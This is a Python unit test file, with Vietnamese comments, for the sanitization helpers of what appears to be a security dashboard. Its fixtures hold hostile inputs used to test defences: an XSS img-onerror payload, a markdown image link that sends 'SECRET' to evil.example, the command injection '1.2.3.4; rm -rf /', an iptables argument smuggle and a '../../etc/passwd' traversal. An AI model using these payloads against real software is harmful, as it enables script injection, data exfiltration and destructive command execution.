import os
import re
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ui import safe  # noqa: E402

XSS = '<img src=x onerror=alert(1)>'


class SafeTest(unittest.TestCase):
    def test_md_escape_neutralises_html_and_markdown(self):
        s = safe.md_escape(XSS)
        self.assertIsNone(re.search(r"(?<!\\)<", s))      # không còn dấu < nào chưa được escape
        self.assertIn("\\<img", s)
        for raw, bad in [("**x**", "**x**"), ("[a](http://e.com)", "[a](http"), ("$$x$$", "$$"),
                         (":red[hi]", ":red[")]:
            self.assertNotIn(bad, safe.md_escape(raw))
        self.assertTrue(safe.md_escape("# h").startswith("\\#"))     # không thành tiêu đề

    def test_md_escape_single_line_and_limit(self):
        s = safe.md_escape("a\nb\r\nc\x00d", limit=5)
        self.assertNotIn("\n", s)
        self.assertNotIn("\x00", s)
        self.assertTrue(s.endswith("…"))
        self.assertEqual(safe.md_escape(None), "")

    def test_md_text_keeps_line_breaks(self):
        self.assertEqual(safe.md_text("a\nb"), "a  \nb")
        self.assertNotIn("<b>", safe.md_text("<b>x</b>"))

    def test_sanitize_blocks_images_and_links(self):
        md = ("![x](http://evil.example/?d=SECRET)\n![ref][r]\n[r]: http://evil.example/p.png\n"
              "[click](http://evil.example) và <https://evil.example/a> và http://evil.example/b\n"
              "```\nsudo iptables -I INPUT -s <srcip> -j DROP\n```")
        out = safe.sanitize_markdown(md)
        self.assertNotIn("![", out)
        self.assertNotIn("](", out)
        self.assertNotIn("[r]: http", out)
        self.assertNotIn("<https", out)
        # URL chỉ còn nằm trong dấu backtick (code span), không tự thành liên kết
        self.assertIn("`http://evil.example`", out)
        self.assertIn("`http://evil.example/b`", out)
        # nội dung hợp lệ (lệnh, placeholder) được giữ nguyên
        self.assertIn("sudo iptables -I INPUT -s <srcip> -j DROP", out)

    def test_sanitize_keeps_plain_text(self):
        t = "## Tóm tắt\n- Bước 1: kiểm tra `auth.log`\n- Bước 2: chặn IP"
        self.assertEqual(safe.sanitize_markdown(t), t)

    def test_badges_use_whitelist_only(self):
        b = safe.severity_badge(XSS)
        self.assertNotIn("<img", b)
        self.assertIn("Không rõ", b)
        self.assertIn("sev-critical", safe.severity_badge("Critical"))
        self.assertNotIn("<img", safe.action_badge(XSS, prefix=XSS))
        self.assertIn("Đã xác nhận", safe.status_badge("confirmed"))
        self.assertIn("Không rõ", safe.status_badge({"a": 1}))

    def test_valid_ip(self):
        self.assertEqual(safe.valid_ip("203.0.113.7"), "203.0.113.7")
        self.assertEqual(safe.valid_ip("2001:db8::1"), "2001:db8::1")
        for bad in ["1.2.3", "1.2.3.4; rm -rf /", "fe80::1%eth0", "", None, 123, "999.1.1.1", "1.2.3.4 -j ACCEPT"]:
            self.assertIsNone(safe.valid_ip(bad), bad)

    def test_is_protected_ip(self):
        prot = ["10.0.0.5", "192.168.0.0/16"]
        self.assertTrue(safe.is_protected_ip("10.0.0.5", prot))
        self.assertTrue(safe.is_protected_ip("192.168.4.4", prot))
        self.assertFalse(safe.is_protected_ip("8.8.8.8", prot))
        self.assertFalse(safe.is_protected_ip("not-an-ip", prot))
        self.assertFalse(safe.is_protected_ip("8.8.8.8", None))

    def test_safe_filename_and_duration(self):
        self.assertEqual(safe.safe_filename("../../etc/passwd"), "etc_passwd")
        self.assertEqual(safe.safe_filename("<>"), "file")
        self.assertEqual(safe.fmt_duration(None), "—")
        self.assertEqual(safe.fmt_duration(3.14), "3.1 s")
        self.assertEqual(safe.fmt_duration(120), "2.0 phút")

    def test_truncate(self):
        self.assertEqual(safe.truncate("abc", 5), "abc")
        self.assertIn("đã cắt", safe.truncate("a" * 20, 5))


if __name__ == "__main__":
    unittest.main()
